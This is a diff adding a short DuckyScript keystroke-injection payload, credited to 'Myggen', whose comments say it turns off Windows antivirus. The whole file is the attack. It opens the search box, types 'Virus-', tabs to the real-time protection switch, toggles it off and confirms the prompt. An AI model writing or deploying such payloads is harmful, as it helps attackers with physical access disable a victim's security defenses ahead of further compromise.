@@ -1,0 +1,29 @@
+REM Turns off Windows Antivirus
+REM May need to change delays
+REM Author: Myggen
+
+DELAY 2000
+REM Open search box and type Antivirus
+GUI s
+DELAY 700
+STRING Virus-
+DELAY 100
+ENTER
+DELAY 700
+
+REM Locating the on/off switch for AV, and turning it off
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 100
+SPACE
+DELAY 150
+LEFTARROW
+DELAY 100
+ENTER
